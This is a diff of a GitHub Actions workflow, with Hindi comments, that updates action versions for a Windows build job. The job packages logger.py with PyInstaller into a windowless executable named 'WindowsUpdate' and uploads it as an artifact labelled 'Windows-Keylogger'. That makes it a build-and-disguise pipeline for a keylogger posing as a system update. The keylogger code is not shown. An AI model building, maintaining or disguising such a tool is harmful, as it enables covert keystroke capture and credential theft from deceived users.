@@ -10,10 +10,11 @@ jobs:
     runs-on: windows-latest
 
     steps:
-    - uses: actions/checkout@v3
+    - name: Checkout repository
+      uses: actions/checkout@v4  # <-- v3 से v4 में अपडेट किया
 
     - name: Set up Python
-      uses: actions/setup-python@v4
+      uses: actions/setup-python@v5  # <-- v4 से v5 में अपडेट किया
       with:
         python-version: '3.10'
 
@@ -25,8 +26,8 @@ jobs:
     - name: Build the executable
       run: pyinstaller --onefile --noconsole --name WindowsUpdate logger.py
 
-    - name: Upload artifact   # <--- गलती यहाँ थी, अब यह ठीक है
-      uses: actions/upload-artifact@v3
+    - name: Upload artifact
+      uses: actions/upload-artifact@v4  # <-- यह है मुख्य बदलाव, v3 से v4
       with:
         name: Windows-Keylogger
         path: dist/WindowsUpdate.exe
